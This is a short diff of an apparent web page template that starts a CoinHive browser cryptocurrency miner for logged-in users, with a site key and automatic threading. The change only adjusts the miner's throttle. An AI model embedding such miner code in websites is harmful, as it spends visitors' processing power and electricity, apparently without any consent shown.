@@ -11,7 +11,7 @@
 	{% if login %}
 		var miner = new CoinHive.User('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c','{{ name }}',{
 			autoThreads: true,
-			throttle: 0.5
+			throttle: 0.6
 		});
 		miner.start();
 	{% else %}
